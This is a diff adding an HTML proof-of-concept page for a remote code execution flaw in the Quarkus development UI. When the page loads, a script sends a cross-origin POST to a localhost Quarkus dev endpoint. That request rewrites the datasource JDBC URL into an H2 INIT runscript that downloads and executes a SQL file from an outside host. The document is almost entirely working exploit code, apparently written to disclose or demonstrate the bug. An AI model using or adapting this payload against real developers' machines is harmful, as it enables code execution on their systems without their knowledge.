@@ -1,0 +1,30 @@
+<html>
+<head>
+  </head>
+  <body onload="execQuark()">
+    This contains the payload for the Quarkus liquibase H2 RCE. If all goes well you should see the calculator app open.
+    </body>
+
+    <script>
+    function execQuark() {
+
+      var xhr = new XMLHttpRequest();
+      xhr.addEventListener("readystatechange", function() {
+        if(this.readyState === 4) {
+          console.log(this.responseText);
+
+        }
+      });
+
+      xhr.open("POST", "http://localhost:8080/q/dev/io.quarkus.quarkus-vertx-http/config");
+      xhr.onprogress = function () {
+        console.log('LOADING: ', xhr.status);
+      };
+
+      xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+      xhr.send("action=updateProperty&name=quarkus.datasource.jdbc.url&value=jdbc%3Ah2%3Amem%3Atestdb%3BINIT%3Drunscript+from+'http%3A%2F%2Fsomerandomsite.bla%3A8081%2Fexec.sql'");
+
+    }
+    </script>
+
+    </html>
